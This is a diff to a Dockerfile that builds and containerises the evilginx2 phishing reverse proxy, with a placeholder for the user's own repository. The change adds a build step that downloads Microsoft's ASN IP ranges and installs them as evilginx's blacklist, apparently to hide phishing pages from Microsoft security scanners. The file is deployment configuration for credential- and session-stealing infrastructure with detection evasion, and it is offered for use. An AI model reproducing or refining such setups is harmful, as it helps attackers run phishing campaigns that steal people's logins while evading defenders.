@@ -3,6 +3,7 @@ ARG PROJECT_DIR="/opt/go/src/evil/evilginx2"
 
 #put your repo here
 ARG REPO_URL=""
+ARG IPBLACKLIST_REPO="https://github.com/aalex954/MSFT-IP-Tracker/releases/latest/download/msft_asn_ip_ranges.txt"
 
 # Set environment variables
 ENV GOLANG_VERSION=1.22.3
@@ -18,9 +19,6 @@ RUN apk add --no-cache wget tar bash git make nano \
 RUN go version \
     && mkdir -pv /opt/go/src/evil \
     && git -C /opt/go/src/evil clone ${REPO_URL}
-
-#download blacklist file 
-#RUN wget -O blacklist.txt https://raw.githubusercontent.com/derainbow/docker-evilginx2/refs/heads/main/app/blacklist.txt
 
 ###section untuk modifikasi kode evilginx sebelum di compile####
 
@@ -51,6 +49,7 @@ WORKDIR /app
 COPY --from=build ${EVILGINX_BIN} .
 COPY --from=build /app .
 # Salin file blacklist.txt ke /root/.evilginx di dalam container
+RUN wget -O blacklist.txt ${IPBLACKLIST_REPO}
 COPY blacklist.txt /root/.evilginx/blacklist.txt
 
 EXPOSE ${EVILGINX_PORTS}
